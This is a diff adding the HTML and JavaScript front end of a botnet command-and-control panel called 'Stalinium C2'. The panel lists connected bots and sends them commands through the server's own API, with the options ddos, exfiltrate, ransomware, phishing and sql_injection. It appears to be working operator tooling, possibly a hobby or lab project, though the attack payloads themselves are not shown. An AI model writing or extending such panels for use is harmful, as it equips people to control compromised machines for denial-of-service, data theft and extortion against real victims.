@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Stalinium C2</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Courier New',monospace;background:#0a0a0a;color:#c8c8c8;padding:24px;max-width:960px;margin:0 auto}
+h1{color:#ff3333;font-size:20px;margin-bottom:4px}
+.subtitle{color:#555;font-size:12px;margin-bottom:24px}
+h2{color:#666;font-size:11px;text-transform:uppercase;letter-spacing:2px;margin:24px 0 8px;border-top:1px solid #1a1a1a;padding-top:16px}
+table{width:100%;border-collapse:collapse}
+th{text-align:left;color:#555;font-size:10px;text-transform:uppercase;letter-spacing:1px;padding:6px 10px;border-bottom:1px solid #1a1a1a}
+td{padding:6px 10px;font-size:13px;border-bottom:1px solid #111}
+.form-row{display:flex;gap:8px;margin-bottom:8px}
+.form-row>*{flex:1}
+label{display:block;color:#555;font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-bottom:3px}
+input,select{width:100%;background:#111;border:1px solid #222;color:#00ff41;padding:7px 8px;font-family:inherit;font-size:13px}
+input:focus,select:focus{outline:none;border-color:#333}
+button{background:#ff3333;color:#000;border:none;padding:8px 24px;cursor:pointer;font-family:inherit;font-weight:bold;font-size:12px;text-transform:uppercase;letter-spacing:1px}
+button:hover{background:#ff5555}
+.result{background:#0f0f0f;border-left:2px solid #222;padding:6px 10px;margin-bottom:6px;font-size:12px}
+.result .meta{color:#444;font-size:10px;margin-bottom:2px}
+.result .output{color:#00ff41}
+.empty{color:#333;font-style:italic;font-size:12px}
+.count{color:#444;font-size:11px;margin-left:8px}
+</style>
+</head>
+<body>
+<h1>STALINIUM C2</h1>
+<p class="subtitle">command &amp; control server</p>
+
+<h2>Connected Bots <span class="count" id="bot-count"></span></h2>
+<div id="bots"><p class="empty">waiting for connections...</p></div>
+
+<h2>Execute Command</h2>
+<div class="form-row">
+  <div><label>Target</label><select id="f-target"></select></div>
+  <div><label>Command</label><select id="f-cmd">
+    <option value="ddos">ddos</option>
+    <option value="exfiltrate">exfiltrate</option>
+    <option value="ransomware">ransomware</option>
+    <option value="phishing">phishing</option>
+    <option value="sql_injection">sql_injection</option>
+  </select></div>
+</div>
+<div class="form-row">
+  <div><label>Arguments (comma separated)</label><input id="f-args" placeholder="arg1, arg2, arg3"></div>
+</div>
+<button onclick="send()">SEND</button>
+
+<h2>Results <span class="count" id="result-count"></span></h2>
+<div id="results"><p class="empty">no results</p></div>
+
+<script>
+const $=id=>document.getElementById(id);
+async function poll(){
+  try{
+    const br=await fetch('/api/bots');const bots=await br.json();
+    $('bot-count').textContent=bots.length?`(${bots.length})`:'';
+    if(!bots.length){$('bots').innerHTML='<p class="empty">waiting for connections...</p>';$('f-target').innerHTML='';}
+    else{
+      let h='<table><tr><th>Address</th><th>Uptime</th></tr>';
+      let opts='';
+      for(const b of bots){const m=Math.floor(b.connected_secs/60),s=b.connected_secs%60;h+=`<tr><td>${b.addr}</td><td>${m}m ${s}s</td></tr>`;opts+=`<option value="${b.addr}">${b.addr}</option>`;}
+      h+='</table>';$('bots').innerHTML=h;
+      const cur=$('f-target').value;$('f-target').innerHTML=opts;
+      if(cur&&bots.find(b=>b.addr===cur))$('f-target').value=cur;
+    }
+    const rr=await fetch('/api/results');const results=await rr.json();
+    $('result-count').textContent=results.length?`(${results.length})`:'';
+    if(!results.length){$('results').innerHTML='<p class="empty">no results</p>';}
+    else{let rh='';for(const r of[...results].reverse()){rh+=`<div class="result"><div class="meta">${r.bot_addr} / ${r.command} / ${r.seconds_ago}s ago</div><div class="output">${r.result}</div></div>`;}$('results').innerHTML=rh;}
+  }catch(e){}
+}
+async function send(){
+  const target=$('f-target').value;if(!target)return;
+  const command=$('f-cmd').value;
+  const args=$('f-args').value?$('f-args').value.split(',').map(s=>s.trim()):[];
+  try{await fetch('/api/command',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({target,command,args})});$('f-args').value='';}catch(e){}
+}
+setInterval(poll,2000);poll();
+</script>
+</body>
+</html>
